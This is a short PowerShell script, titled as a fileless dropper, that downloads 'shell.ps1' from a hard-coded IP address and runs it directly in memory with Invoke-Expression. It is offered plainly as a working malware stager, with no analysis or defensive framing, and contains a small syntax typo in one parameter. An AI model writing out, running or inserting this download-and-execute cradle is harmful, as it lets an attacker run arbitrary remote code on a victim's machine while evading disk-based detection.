# Fileless Powershell Dropper - Memory Execution of Payload

$remotePayload = "http://146.190.226.7/shell.ps1"

try{
$code = Invoke-WebRequest -Uri $remotePayload =UseBasicParsing
IEX $code.Content
} catch {
    Write-Error "Failed to retrieve  or execute payload"
}
